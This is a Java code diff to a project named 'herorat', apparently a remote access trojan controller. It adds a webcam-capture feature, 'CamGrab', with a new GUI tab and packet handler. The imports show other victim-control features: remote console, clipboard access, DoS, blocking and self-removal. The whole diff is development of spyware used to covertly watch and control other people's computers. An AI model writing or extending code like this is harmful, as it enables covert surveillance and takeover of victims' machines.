@@ -10,6 +10,7 @@ import java.util.Date;
 
 import net.herorat.Main;
 import net.herorat.features.blocker.Blocker;
+import net.herorat.features.camgrab.CamGrab;
 import net.herorat.features.chat.Chat;
 import net.herorat.features.clipboard.Clipboard;
 import net.herorat.features.console.Console;
@@ -36,6 +37,7 @@ import net.herorat.network.Packet14Blocker;
 import net.herorat.network.Packet15Clipboard;
 import net.herorat.network.Packet16Remote;
 import net.herorat.network.Packet17Suicide;
+import net.herorat.network.Packet18CamGrab;
 import net.herorat.network.Packet1Ping;
 import net.herorat.network.Packet2Console;
 import net.herorat.network.Packet3Dos;
@@ -194,6 +196,7 @@ public class Server extends Thread
 			Main.mainWindow.panel_tab9.combo_select.removeItemAt(pos);
 			Main.mainWindow.panel_tab10.combo_select.removeItemAt(pos);
 			Main.mainWindow.panel_tab11.combo_select.removeItemAt(pos);
+			Main.mainWindow.panel_tab12.combo_select.removeItemAt(pos);
 		}
 		
 		if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab3.combo_selected_item)))
@@ -294,6 +297,17 @@ public class Server extends Thread
 			pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab11.combo_selected_item));
 			Main.mainWindow.panel_tab11.combo_select.setSelectedIndex(pos);
 		}
+		
+		if (this.equals(Network.findWithCombo(Main.mainWindow.panel_tab12.combo_selected_item)))
+		{
+			Main.mainWindow.panel_tab12.combo_selected_item = "";
+			Main.mainWindow.panel_tab12.combo_select.setSelectedIndex(0);
+		}
+		else
+		{
+			pos = Network.getServerPositionInList(Network.findWithCombo(Main.mainWindow.panel_tab12.combo_selected_item));
+			Main.mainWindow.panel_tab12.combo_select.setSelectedIndex(pos);
+		}
 
 		try
 		{
@@ -389,6 +403,9 @@ public class Server extends Thread
 						packet = new Packet17Suicide(inputstream);
 						Suicide.handle(this, packet.read());					// OK
 						break;
+					case 18:
+						packet = new Packet18CamGrab(inputstream);
+						CamGrab.handle(this, packet.read());
 				}
 			}
 			catch (Exception e)
